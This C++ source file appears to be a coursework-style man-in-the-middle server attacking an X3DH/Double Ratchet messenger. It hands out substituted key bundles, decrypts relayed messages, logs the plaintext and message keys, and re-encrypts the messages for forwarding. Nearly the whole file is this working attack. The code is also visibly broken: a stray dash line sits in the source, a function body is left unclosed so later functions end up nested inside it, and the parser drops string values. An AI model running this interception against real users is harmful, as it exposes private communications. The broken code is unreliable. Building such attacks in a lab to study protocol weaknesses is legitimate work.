#include <arpa/inet.h>
#include <netinet/in.h>
#include <sodium.h>
#include <sys/socket.h>
#include <unistd.h>

#include <array>
#include <cstdint>
#include <cstring>
#include <cstdlib>
#include <stdexcept>
#include <iostream>
#include <map>
#include <mutex>
#include <optional>
#include <string>
#include <thread>
#include <vector>

using namespace std;

using Bytes = vector<uint8_t>;
using Key32 = array<uint8_t, 32>;

static string b64(const uint8_t *p, size_t n)
{
    string out(sodium_base64_encoded_len(n, sodium_base64_VARIANT_ORIGINAL),
               '\0');
    sodium_bin2base64(out.data(), out.size(), p, n,
                      sodium_base64_VARIANT_ORIGINAL);
    out.resize(strlen(out.c_str()));
    return out;
}
static string b64(const Bytes &b) { return b64(b.data(), b.size()); }
static string b64(const Key32 &k) { return b64(k.data(), k.size()); }

static Bytes unb64(const string &s)
{
    Bytes out(s.size());
    size_t real = 0;
    if (sodium_base642bin(out.data(), out.size(), s.c_str(), s.size(), nullptr,
                          &real, nullptr, sodium_base64_VARIANT_ORIGINAL) != 0)
        return {};
    out.resize(real);
    return out;
}
static Key32 unb64_32(const string &s)
{
    Bytes b = unb64(s);
    Key32 k{};
    if (b.size() == 32)
        memcpy(k.data(), b.data(), 32);
    return k;
}

struct DH
{
    Key32 pub{}, priv{};
};

static DH x25519_generate()
{
    DH d;
    randombytes_buf(d.priv.data(), 32);
    crypto_scalarmult_base(d.pub.data(), d.priv.data());
    return d;
}
static Key32 x25519(const Key32 &priv, const Key32 &pub)
{
    Key32 out{};
    int rc = crypto_scalarmult(out.data(), priv.data(), pub.data());
    (void)rc;
    return out;
}
static Key32 hmac256(const Key32 &key, const uint8_t *msg, size_t n)
{
    Key32 out{};
    crypto_auth_hmacsha256_state st;
    crypto_auth_hmacsha256_init(&st, key.data(), 32);
    crypto_auth_hmacsha256_update(&st, msg, n);
    crypto_auth_hmacsha256_final(&st, out.data());
    return out;
}

static Bytes hkdf(const Key32 &salt, const Bytes &ikm, const string &info,
                  size_t len)
{
    Key32 prk{};
    {
        crypto_auth_hmacsha256_state st;
        crypto_auth_hmacsha256_init(&st, salt.data(), 32);
        crypto_auth_hmacsha256_update(&st, ikm.data(), ikm.size());
        crypto_auth_hmacsha256_final(&st, prk.data());
    }
    Bytes out;
    Bytes t;
    uint8_t ctr = 1;
    while (out.size() < len)
    {
        crypto_auth_hmacsha256_state st;
        crypto_auth_hmacsha256_init(&st, prk.data(), 32);
        if (!t.empty())
            crypto_auth_hmacsha256_update(&st, t.data(), t.size());
        crypto_auth_hmacsha256_update(&st, (const uint8_t *)info.data(),
                                      info.size());
        crypto_auth_hmacsha256_update(&st, &ctr, 1);
        Key32 block{};
        crypto_auth_hmacsha256_final(&st, block.data());
        t.assign(block.begin(), block.end());
        out.insert(out.end(), t.begin(), t.end());
        ++ctr;
    }
    out.resize(len);
    return out;
}

static pair<Key32, Key32> kdf_rk(const Key32 &rk, const Key32 &dh_out)
{
    Bytes ikm(dh_out.begin(), dh_out.end());
    Bytes o = hkdf(rk, ikm, "AS3_ROOT", 64);
    Key32 nrk{}, nck{};
    memcpy(nrk.data(), o.data(), 32);
    memcpy(nck.data(), o.data() + 32, 32);
    return {nrk, nck};
}
static pair<Key32, Key32> kdf_ck(const Key32 &ck)
{
    uint8_t one = 0x01, two = 0x02;
    return {hmac256(ck, &one, 1), hmac256(ck, &two, 1)};
}

static const uint8_t ZERO_NONCE[12] = {0};

static Bytes aead_encrypt(const Key32 &mk, const Bytes &pt, const Bytes &ad)
{
    Bytes ct(pt.size() + crypto_aead_chacha20poly1305_ietf_ABYTES);
    unsigned long long clen = 0;
    crypto_aead_chacha20poly1305_ietf_encrypt(
        ct.data(), &clen, pt.data(), pt.size(), ad.data(), ad.size(), nullptr,
        ZERO_NONCE, mk.data());
    ct.resize(clen);
    return ct;
}
static optional<Bytes> aead_decrypt(const Key32 &mk, const Bytes &ct,
                                    const Bytes &ad)
{
    Bytes pt(ct.size());
    unsigned long long plen = 0;
    if (crypto_aead_chacha20poly1305_ietf_decrypt(
            pt.data(), &plen, nullptr, ct.data(), ct.size(), ad.data(),
            ad.size(), ZERO_NONCE, mk.data()) != 0)
        return nullopt;
    pt.resize(plen);
    return pt;
}

static Bytes chacha20_unauth_decrypt(const Key32 &mk, const Bytes &ct)
{
    if (ct.size() < crypto_aead_chacha20poly1305_ietf_ABYTES)
        return {};
    size_t mlen = ct.size() - crypto_aead_chacha20poly1305_ietf_ABYTES;
    Bytes pt(mlen);
    crypto_stream_chacha20_ietf_xor_ic(pt.data(), ct.data(), mlen, ZERO_NONCE, 1,
                                       mk.data());
    return pt;
}

static string to_hex(const uint8_t *p, size_t n)
{
    static const char *d = "0123456789abcdef";
    string s;
    s.reserve(n * 2);
    for (size_t i = 0; i < n; i++)
    {
        s.push_back(d[p[i] >> 4]);
        s.push_back(d[p[i] & 0xf]);
    }
    return s;
}
static string to_hex(const Bytes &b) { return to_hex(b.data(), b.size()); }
static string to_hex(const Key32 &k) { return to_hex(k.data(), k.size()); }

static string printable(const Bytes &b)
{
    string s;
    for (uint8_t c : b)
    {
        if (c >= 0x20 && c < 0x7f)
            s.push_back((char)c);
        else
        {
            static const char *d = "0123456789abcdef";
            s += "\\x";
            s.push_back(d[c >> 4]);
            s.push_back(d[c & 0xf]);
        }
    }
    return s;
}

-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -

                                                                                                         struct JV
{
    enum T
    {
        NUL,
        BOOL,
        INT,
        STR,
        OBJ,
        ARR
    } t = NUL;
    bool b = false;
    long i = 0;
    string s;
    map<string, JV> obj;
    vector<JV> arr;

    bool has(const string &k) const { return obj.count(k) > 0; }
    const JV &at(const string &k) const
    {
        static JV nul;
        auto it = obj.find(k);
        return it == obj.end() ? nul : it->second;
    }
    string str(const string &k) const { return at(k).s; }
    long num(const string &k) const { return at(k).i; }
};

struct JParser
{
    const string &s;
    size_t p = 0;
    explicit JParser(const string &in) : s(in) {}
    void ws()
    {
        while (p < s.size() && (s[p] == ' ' || s[p] == '\t' || s[p] == '\r' ||
                                s[p] == '\n'))
            ++p;
    }
    JV parse() { return value(); }
    JV value()
    {
        ws();
        if (p >= s.size())
            return {};
        char c = s[p];
        if (c == '{')
            return object();
        if (c == '[')
            return array();
        if (c == '"')
        {
            JV v;
            v.t = JV::STR;
            v.s = string();
            return v;
        }
        if (c == 't' || c == 'f')
        {
            JV v;
            v.t = JV::BOOL;
            v.b = (c == 't');
            while (p < s.size() && s[p] != ',' && s[p] != '}' && s[p] != ']')
                ++p;
            return v;
        }
        if (c == 'n')
        {
            while (p < s.size() && s[p] != ',' && s[p] != '}' && s[p] != ']')
                ++p;
            return {};
        }
        JV v;
        v.t = JV::INT;
        v.i = strtol(s.c_str() + p, nullptr, 10);
        while (p < s.size() && (s[p] == '-' || s[p] == '+' || (s[p] >= '0' && s[p] <= '9')))
            ++p;
        return v;
    }
    string string()
    {
        string out;
        ++p;
        while (p < s.size() && s[p] != '"')
        {
            if (s[p] == '\\' && p + 1 < s.size())
            {
                ++p;
                char e = s[p];
                if (e == 'n')
                    out.push_back('\n');
                else if (e == 't')
                    out.push_back('\t');
                else if (e == 'r')
                    out.push_back('\r');
                else
                    out.push_back(e);
            }
            else
            {
                out.push_back(s[p]);
            }
            ++p;
        }
        if (p < s.size())
            ++p;
        return out;
    }
    JV object()
    {
        JV v;
        v.t = JV::OBJ;
        ++p;
        ws();
        if (p < s.size() && s[p] == '}')
        {
            ++p;
            return v;
        }
        for (;;)
        {
            ws();
            string k = string();
            ws();
            if (p < s.size() && s[p] == ':')
                ++p;
            v.obj[k] = value();
            ws();
            if (p < s.size() && s[p] == ',')
            {
                ++p;
                continue;
            }
            if (p < s.size() && s[p] == '}')
                ++p;
            break;
        }
        return v;
    }
    JV array()
    {
        JV v;
        v.t = JV::ARR;
        ++p;
        ws();
        if (p < s.size() && s[p] == ']')
        {
            ++p;
            return v;
        }
        for (;;)
        {
            v.arr.push_back(value());
            ws();
            if (p < s.size() && s[p] == ',')
            {
                ++p;
                continue;
            }
            if (p < s.size() && s[p] == ']')
                ++p;
            break;
        }
        return v;
    }
};

static JV jparse(const string &s) { return JParser(s).parse(); }

static string jstr(const string &s)
{
    string out = "\"";
    for (char c : s)
    {
        if (c == '"' || c == '\\')
            out.push_back('\\');
        out.push_back(c);
    }
    out.push_back('"');
    return out;
}

struct State
{
    Key32 RK{};
    DH DHs;
    Key32 DHr{};
    bool have_DHr = false;
    Key32 CKs{}, CKr{};
    bool have_CKs = false, have_CKr = false;
    long Ns = 0, Nr = 0, PN = 0;
    Bytes AD;
    map<string, Key32> skipped;
};

static const int MAX_SKIP = 1000;

static State ratchet_init_sender(const Key32 &sk, const Key32 &their_spk,
                                 const Bytes &ad)
{
    State st;
    st.RK = sk;
    st.DHr = their_spk;
    st.have_DHr = true;
    st.AD = ad;
    st.DHs = x25519_generate();
    auto [rk, cks] = kdf_rk(st.RK, x25519(st.DHs.priv, their_spk));
    st.RK = rk;
    st.CKs = cks;
    st.have_CKs = true;
    return st;
}
static State ratchet_init_receiver(const Key32 &sk, const DH &my_spk,
                                   const Bytes &ad)
{
    State st;
    st.RK = sk;
    st.DHs = my_spk;
    st.have_DHr = false;
    st.AD = ad;
    return st;
}

static void dh_ratchet(State &st, const Key32 &their_dh)
{
    st.PN = st.Ns;
    st.Ns = 0;
    st.Nr = 0;
    st.DHr = their_dh;
    st.have_DHr = true;
    auto [rk1, ckr] = kdf_rk(st.RK, x25519(st.DHs.priv, st.DHr));
    st.RK = rk1;
    st.CKr = ckr;
    st.have_CKr = true;
    st.DHs = x25519_generate();
    auto [rk2, cks] = kdf_rk(st.RK, x25519(st.DHs.priv, st.DHr));
    st.RK = rk2;
    st.CKs = cks;
    st.have_CKs = true;
}

static void skip_message_keys(State &st, long until)
{
    if (until - st.Nr > MAX_SKIP)
        throw runtime_error("too many skipped messages");
    if (!st.have_CKr)
        return;
    while (st.Nr < until)
    {
        auto [mk, nck] = kdf_ck(st.CKr);
        st.CKr = nck;
        st.skipped[b64(st.DHr) + ":" + to_string(st.Nr)] = mk;
        st.Nr++;
    }
}

struct Enc
{
    string dh;
    long pn, n;
    Bytes ct;
};
static Enc ratchet_encrypt(State &st, const Bytes &pt)
{
    auto [mk, ncks] = kdf_ck(st.CKs);
    st.CKs = ncks;
    Enc e;
    e.dh = b64(st.DHs.pub);
    e.pn = st.PN;
    e.n = st.Ns;
    st.Ns++;

    e.ct = aead_encrypt(mk, pt, st.AD);
    return e;
}

struct DecryptProbe
{
    bool have_mk = false;
    Key32 mk{};
    Bytes ad;
    Bytes alt_ad;
};

static optional<Bytes> ratchet_decrypt(State &st, const string &dh_b64,
                                       long pn, long n, const Bytes &ct,
                                       const string *alt_hdr = nullptr,
                                       DecryptProbe *probe = nullptr)
{
    (void)alt_hdr;

    Bytes ad = st.AD;
    if (probe)
        probe->ad = ad;
    auto two = [&](const Key32 &mk) -> optional<Bytes>
    {
        if (probe)
        {
            probe->have_mk = true;
            probe->mk = mk;
        }
        return aead_decrypt(mk, ct, ad);
    };

    string sk = dh_b64 + ":" + to_string(n);
    auto it = st.skipped.find(sk);
    if (it != st.skipped.end())
    {
        Key32 mk = it->second;
        auto out = two(mk);
        if (out)
            st.skipped.erase(it);
        return out;
    }

    Key32 their_dh = unb64_32(dh_b64);
    if (!st.have_DHr || memcmp(their_dh.data(), st.DHr.data(), 32) != 0)
    {
        skip_message_keys(st, pn);
        dh_ratchet(st, their_dh);
    }
    skip_message_keys(st, n);
    auto [mk, nckr] = kdf_ck(st.CKr);
    st.CKr = nckr;
    st.Nr++;
    return two(mk);
}

struct FakeIdentity
{

    array<uint8_t, 32> ik_sig_pub{};
    array<uint8_t, 64> ik_sig_priv{};
    DH ik_dh;
    DH spk;
    string spk_sig_b64;
    map<int, DH> opks;
};

static FakeIdentity make_fake_identity()
{
    FakeIdentity f;
    crypto_sign_keypair(f.ik_sig_pub.data(), f.ik_sig_priv.data());
    f.ik_dh = x25519_generate();
    f.spk = x25519_generate();
    array<uint8_t, 64> sig{};
    unsigned long long siglen = 0;
    crypto_sign_detached(sig.data(), &siglen, f.spk.pub.data(), 32,
                         f.ik_sig_priv.data());
    f.spk_sig_b64 = b64(sig.data(), 64);
    for (int id = 1; id <= 8; ++id)
        f.opks[id] = x25519_generate();
    return f;
}

struct RealBundle
{
    bool present = false;
    string ik_sig, ik_dh, spk, spk_sig, opk;
    int opk_id = 0;
    int count = 0;
};

struct Mailbox
{
    vector<string> frames;
};

struct Hub
{
    mutex mu;
    map<string, RealBundle> real;
    map<string, FakeIdentity> fake;
    map<string, Mailbox> mailbox;
    map<string, State> session;
    map<string, bool> session_ready;
    map<string, bool> to_peer_first;
    map<string, string> init_for;

    FakeIdentity &fake_for(const string &name)
    {
        if (!fake.count(name))
            fake[name] = make_fake_identity();
        return fake[name];
    }
};

static Hub g_hub;

static string fake_bundle_json(const string &name)
{
    FakeIdentity &f = g_hub.fake_for(name);

    int opk_id = 1;
    DH &opk = f.opks[opk_id];
    string b = "{";
    b += "\"user\":" + jstr(name) + ",";
    b += "\"ik_sig\":" + jstr(b64(f.ik_sig_pub.data(), 32)) + ",";
    b += "\"ik_dh\":" + jstr(b64(f.ik_dh.pub)) + ",";
    b += "\"spk\":" + jstr(b64(f.spk.pub)) + ",";
    b += "\"spk_sig\":" + jstr(f.spk_sig_b64) + ",";
    b += "\"opk\":" + jstr(b64(opk.pub)) + ",";
    b += "\"opk_id\":" + to_string(opk_id);
    b += "}";
    return b;

    static void respond_session(const string &from, const string &to,
                                const JV &init)
    {
        FakeIdentity &f = g_hub.fake_for(to);
        Key32 ik_dh_init = unb64_32(init.str("ik_dh"));
        Key32 ek = unb64_32(init.str("ek"));
        int opk_id = (int)init.num("opk_id");

        Key32 dh1 = x25519(f.spk.priv, ik_dh_init);
        Key32 dh2 = x25519(f.ik_dh.priv, ek);
        Key32 dh3 = x25519(f.spk.priv, ek);
        Bytes ikm(32, 0xFF);
        ikm.insert(ikm.end(), dh1.begin(), dh1.end());
        ikm.insert(ikm.end(), dh2.begin(), dh2.end());
        ikm.insert(ikm.end(), dh3.begin(), dh3.end());
        if (opk_id != 0 && f.opks.count(opk_id))
        {
            Key32 dh4 = x25519(f.opks[opk_id].priv, ek);
            ikm.insert(ikm.end(), dh4.begin(), dh4.end());
        }
        Key32 salt{};
        Bytes skb = hkdf(salt, ikm, "AS3_X3DH", 32);
        Key32 sk{};
        memcpy(sk.data(), skb.data(), 32);

        Bytes ad(ik_dh_init.begin(), ik_dh_init.end());
        ad.insert(ad.end(), f.ik_dh.pub.begin(), f.ik_dh.pub.end());
        g_hub.session[from] = ratchet_init_receiver(sk, f.spk, ad);
        g_hub.session_ready[from] = true;
        cerr << "[mitm] responder session established with " << from << "\n";
    }

    static bool initiate_session(const string &to, const FakeIdentity &as_me)
    {
        if (g_hub.session_ready[to])
            return true;
        auto it = g_hub.real.find(to);
        if (it == g_hub.real.end() || !it->second.present)
        {
            cerr << "[mitm] no real bundle for " << to << " yet\n";
            return false;
        }
        RealBundle &rb = it->second;
        Key32 spk = unb64_32(rb.spk);
        Key32 ik_dh = unb64_32(rb.ik_dh);
        Key32 opk{};
        bool have_opk = !rb.opk.empty();
        if (have_opk)
            opk = unb64_32(rb.opk);

        DH ek = x25519_generate();
        Key32 dh1 = x25519(as_me.ik_dh.priv, spk);
        Key32 dh2 = x25519(ek.priv, ik_dh);
        Key32 dh3 = x25519(ek.priv, spk);
        Bytes ikm(32, 0xFF);
        ikm.insert(ikm.end(), dh1.begin(), dh1.end());
        ikm.insert(ikm.end(), dh2.begin(), dh2.end());
        ikm.insert(ikm.end(), dh3.begin(), dh3.end());
        if (have_opk)
        {
            Key32 dh4 = x25519(ek.priv, opk);
            ikm.insert(ikm.end(), dh4.begin(), dh4.end());
        }
        Key32 salt{};
        Bytes skb = hkdf(salt, ikm, "AS3_X3DH", 32);
        Key32 sk{};
        memcpy(sk.data(), skb.data(), 32);

        Bytes ad(as_me.ik_dh.pub.begin(), as_me.ik_dh.pub.end());
        ad.insert(ad.end(), ik_dh.begin(), ik_dh.end());
        g_hub.session[to] = ratchet_init_sender(sk, spk, ad);
        g_hub.session_ready[to] = true;
        g_hub.to_peer_first[to] = true;

        string init = "{";
        init += "\"ik_sig\":" + jstr(b64(as_me.ik_sig_pub.data(), 32)) + ",";
        init += "\"ik_dh\":" + jstr(b64(as_me.ik_dh.pub)) + ",";
        init += "\"ek\":" + jstr(b64(ek.pub)) + ",";
        init += "\"opk_id\":" + to_string(rb.opk_id);
        init += "}";
        g_hub.init_for[to] = init;
        cerr << "[mitm] initiator session established toward " << to << "\n";
        return true;
    }

    static string build_frame(const string &from, const string &to,
                              const Enc &e, const string &init_json)
    {
        string h = "{\"dh\":" + jstr(e.dh) + ",\"pn\":" +
                   to_string(e.pn) + ",\"n\":" + to_string(e.n);
        if (!init_json.empty())
            h += ",\"init\":" + init_json;
        h += "}";
        string f = "{\"from\":" + jstr(from) + ",\"to\":" + jstr(to) +
                   ",\"header\":" + h + ",\"ct\":" + jstr(b64(e.ct)) + "}";
        return f;
    }

    static void intercept(const string &from, const string &to,
                          const JV &frame)
    {
        const JV &hdr = frame.at("header");
        string dh = hdr.str("dh");
        long pn = hdr.num("pn");
        long n = hdr.num("n");
        Bytes ct = unb64(frame.str("ct"));

        if (hdr.has("init") && !g_hub.session_ready[from])
            respond_session(from, to, hdr.at("init"));

        string alt_hdr;
        const string *alt_hdr_p = nullptr;
        if (hdr.has("init"))
        {
            const JV &in = hdr.at("init");
            alt_hdr = "{\"dh\":" + jstr(dh) + ",\"pn\":" + to_string(pn) +
                      ",\"n\":" + to_string(n) + ",\"init\":{\"ik_sig\":" +
                      jstr(in.str("ik_sig")) + ",\"ik_dh\":" + jstr(in.str("ik_dh")) +
                      ",\"ek\":" + jstr(in.str("ek")) + ",\"opk_id\":" +
                      to_string(in.num("opk_id")) + "}}";
            alt_hdr_p = &alt_hdr;
        }

        if (!g_hub.session_ready[from])
        {
            cerr << "[mitm] FORWARD-ONLY " << from << "->" << to
                 << " (no session, opaque relay)\n";
            g_hub.mailbox[to].frames.push_back(
                "{\"from\":" + jstr(from) + ",\"to\":" + jstr(to) +
                ",\"header\":" + "{\"dh\":" + jstr(dh) + ",\"pn\":" +
                to_string(pn) + ",\"n\":" + to_string(n) + "}" +
                ",\"ct\":" + jstr(frame.str("ct")) + "}");
            return;
        }

        optional<Bytes> pt;
        DecryptProbe probe;
        try
        {
            pt = ratchet_decrypt(g_hub.session[from], dh, pn, n, ct, alt_hdr_p,
                                 &probe);
        }
        catch (const exception &ex)
        {
            cerr << "[mitm] decrypt error " << from << ": " << ex.what()
                 << "\n";
            pt = nullopt;
        }
        if (!pt)
        {
            cerr << "[mitm] AUTH-FAIL " << from << "->" << to
                 << " (cannot recover, relaying opaque)\n";

            if (probe.have_mk)
            {
                Bytes cand = chacha20_unauth_decrypt(probe.mk, ct);
                cerr << "[diag] message_key   = " << to_hex(probe.mk) << "\n";
                cerr << "[diag] nonce         = " << to_hex(ZERO_NONCE, 12)
                     << "\n";
                cerr << "[diag] ciphertext    = " << to_hex(ct) << "\n";
                cerr << "[diag] primary_AD    = " << to_hex(probe.ad) << "\n";
                cerr << "[diag]   as_text      \"" << printable(probe.ad)
                     << "\"\n";
                if (!probe.alt_ad.empty())
                {
                    cerr << "[diag] alt_AD(init)  = " << to_hex(probe.alt_ad)
                         << "\n";
                    cerr << "[diag]   as_text      \""
                         << printable(probe.alt_ad) << "\"\n";
                }
                cerr << "[diag] UNAUTH_PLAINTEXT = \"" << printable(cand)
                     << "\"\n";
                cerr << "[diag]   (readable above => key OK, AD mismatch only; "
                        "garbage => key/nonce wrong)\n";
            }
            else
            {
                cerr << "[diag] no message key was derived (session/ratchet "
                        "path not reached)\n";
            }
            g_hub.mailbox[to].frames.push_back(
                "{\"from\":" + jstr(from) + ",\"to\":" + jstr(to) +
                ",\"header\":{\"dh\":" + jstr(dh) + ",\"pn\":" +
                to_string(pn) + ",\"n\":" + to_string(n) +
                "},\"ct\":" + jstr(frame.str("ct")) + "}");
            return;
        }

        string plaintext((char *)pt->data(), pt->size());
        cerr << "[mitm] RECOVERED " << from << "->" << to << ": \""
             << plaintext << "\"\n";

        FakeIdentity &as_sender = g_hub.fake_for(from);
        if (!initiate_session(to, as_sender))
        {
            cerr << "[mitm] cannot forward to " << to
                 << " (no session yet), dropping\n";
            return;
        }

        Enc e = ratchet_encrypt(g_hub.session[to], *pt);
        string init_json;
        if (g_hub.to_peer_first[to])
        {
            init_json = g_hub.init_for[to];
            g_hub.to_peer_first[to] = false;
        }
        g_hub.mailbox[to].frames.push_back(build_frame(from, to, e, init_json));
        cerr << "[mitm] RE-ENCRYPTED " << from << "->" << to
             << " and queued for delivery\n";
    }

    static bool send_line(int fd, const string &s)
    {
        string o = s + "\n";
        return send(fd, o.data(), o.size(), 0) == (ssize_t)o.size();
    }

    static void handle_request(int fd, const string &line)
    {
        JV req = jparse(line);
        string type = req.str("type");
        lock_guard<mutex> lk(g_hub.mu);

        if (type == "register")
        {
            send_line(fd, "{\"type\":\"ok\",\"ok\":true}");
        }
        else if (type == "publish")
        {
            string user = req.str("user");
            const JV &bundle = req.at("bundle");
            RealBundle rb;
            rb.present = true;
            rb.ik_sig = bundle.str("ik_sig");
            rb.ik_dh = bundle.str("ik_dh");
            rb.spk = bundle.str("spk");
            rb.spk_sig = bundle.str("spk_sig");
            if (req.has("opks") && req.at("opks").t == JV::ARR &&
                !req.at("opks").arr.empty())
            {
                const JV &first = req.at("opks").arr.front();
                rb.opk = first.str("pub");
                rb.opk_id = (int)first.num("id");
                rb.count = (int)req.at("opks").arr.size();
            }
            g_hub.real[user] = rb;
            cerr << "[srv] stored real bundle for " << user << " (count="
                 << rb.count << ")\n";
            send_line(fd, "{\"type\":\"ok\",\"ok\":true,\"count\":" + to_string(rb.count) +
                              "}");
        }
        else if (type == "fetch_bundle")
        {
            string user = req.str("user");
            string bundle = fake_bundle_json(user);
            cerr << "[mitm] handing SUBSTITUTED bundle for " << user
                 << " to a fetcher\n";
            send_line(fd, "{\"type\":\"bundle\",\"bundle\":" + bundle +
                              ",\"count\":99}");
        }
        else if (type == "send")
        {
            const JV &frame = req.at("frame");
            string from = frame.str("from");
            string to = frame.str("to");
            intercept(from, to, frame);
            send_line(fd, "{\"type\":\"ok\",\"ok\":true}");
        }
        else if (type == "poll")
        {
            string user = req.str("user");
            string out = "{\"type\":\"frames\",\"frames\":[";
            auto &mb = g_hub.mailbox[user];
            for (size_t i = 0; i < mb.frames.size(); ++i)
            {
                if (i)
                    out += ",";
                out += mb.frames[i];
            }
            out += "]}";
            mb.frames.clear();
            send_line(fd, out);
        }
        else
        {
            send_line(fd, "{\"type\":\"err\",\"err\":\"unknown\"}");
        }
    }

    static void serve_client(int fd)
    {
        string buf;
        char chunk[8192];
        for (;;)
        {
            ssize_t r = recv(fd, chunk, sizeof(chunk), 0);
            if (r <= 0)
                break;
            buf.append(chunk, r);
            size_t nl;
            while ((nl = buf.find('\n')) != string::npos)
            {
                string line = buf.substr(0, nl);
                buf.erase(0, nl + 1);
                if (!line.empty())
                    handle_request(fd, line);
            }
        }
        close(fd);
    }

    int main(int argc, char **argv)
    {
        if (sodium_init() < 0)
        {
            cerr << "libsodium init failed\n";
            return 1;
        }
        int port = 9000;
        for (int i = 1; i < argc; ++i)
        {
            string a = argv[i];
            if (a == "--port" && i + 1 < argc)
                port = atoi(argv[++i]);
            else if (a == "--help")
            {
                cout << "usage: attack2 [--port 9000]\n";
                return 0;
            }
        }

        int srv = socket(AF_INET, SOCK_STREAM, 0);
        int opt = 1;
        setsockopt(srv, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));
        sockaddr_in addr{};
        addr.sin_family = AF_INET;
        addr.sin_addr.s_addr = INADDR_ANY;
        addr.sin_port = htons(port);
        if (bind(srv, (sockaddr *)&addr, sizeof(addr)) < 0)
        {
            perror("bind");
            return 1;
        }
        listen(srv, 32);
        cerr << "[mitm] malicious server listening on :" << port << "\n";
        for (;;)
        {
            int fd = accept(srv, nullptr, nullptr);
            if (fd < 0)
                continue;
            thread(serve_client, fd).detach();
        }
        return 0;
    }
